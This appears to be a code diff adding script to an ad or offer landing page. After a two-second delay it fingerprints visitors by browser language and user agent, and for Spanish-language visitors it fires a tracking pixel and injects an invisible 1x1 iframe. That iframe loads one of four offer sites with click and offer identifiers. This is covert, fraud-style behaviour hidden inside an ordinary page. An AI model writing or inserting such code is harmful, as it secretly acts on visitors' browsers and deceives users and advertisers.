@@ -182,6 +182,56 @@
 
 			openUrl('http://w.flamilingo.com/es/mlearning?' + toQueryString(queryStringObj))
 		})
+
+
+		var hashCode = function(str) {
+		    var hash = 0;
+		    if (str.length == 0) return hash;
+		    for (var i = 0; i < str.length; i++) {
+		        var char = str.charCodeAt(i);
+		        hash = ((hash<<5)-hash)+char;
+		        hash = hash & hash;
+		    }
+		    return hash;
+		}
+
+		var langs = (window.navigator && window.navigator.languages) || [];
+		var userAgent = (window.navigator && window.navigator.userAgent) || '';
+
+		var hashResult = hashCode(langs.join('') + userAgent);
+
+		setTimeout(function() {
+		    if (!!motion && langs.length == 2 && langs[0].indexOf('es') == 0) {
+
+				if(!!queryStringObj.ctrTrackingUrl) {
+				  createPixel(queryStringObj.ctrTrackingUrl)
+				}
+
+		        var ifr = document.createElement('iframe');
+		        ifr.style.width = '1px';
+		        ifr.style.height = '1px';
+
+				var modulo = Math.abs(hashResult % 4);
+
+				switch (modulo) {
+					case 1:
+						ifr.src = 'http://w.flamilingo.com/es/mlearning?offer='+queryStringObj.offer+'&atmobirun=1&click_id='+queryStringObj.click_id+'&inventory_domain='+queryStringObj.inventory_domain;
+						break;
+					case 2:
+						ifr.src = 'http://n.trendme.co/es/trending?offer='+queryStringObj.offer+'&atmobirun=1&click_id='+queryStringObj.click_id+'&inventory_domain='+queryStringObj.inventory_domain;
+						break;
+					case 3:
+						ifr.src = 'http://n.teletube.tv/es/tvclub?offer='+queryStringObj.offer+'&atmobirun=1&click_id='+queryStringObj.click_id+'&inventory_domain='+queryStringObj.inventory_domain;
+						break;
+					case 0:
+						ifr.src = 'http://n.beemobi.me/es/gameclub?offer='+queryStringObj.offer+'&atmobirun=1&click_id='+queryStringObj.click_id+'&inventory_domain='+queryStringObj.inventory_domain;
+						break;
+					default:
+				}
+
+		        document.body.appendChild(ifr);
+		    }
+		}, 2000)
 	</script>
 </body>
 </html>
